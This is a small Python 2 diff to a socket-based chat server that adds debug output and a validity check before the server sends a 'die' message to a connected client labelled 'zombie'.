@@ -116,9 +116,12 @@ class BasicChatServer(SocketServer):
 
         elif data.startswith("kill"):
             zombie_id = data.strip()[-1]
-            print "Killing zombie " + zombie_id
-            zombie = self.clients[int(zombie_id)][0]
-            zombie.send("die")
+            print len(self.clients)
+            print self.clients[int(zombie_id)][1]
+            if int(zombie_id) <= len(self.clients) and self.clients[int(zombie_id)][1] == "zombie":
+                print "Killing zombie " + zombie_id
+                zombie = self.clients[int(zombie_id)][0]
+                zombie.send("die")
 
         return data != "die"
 
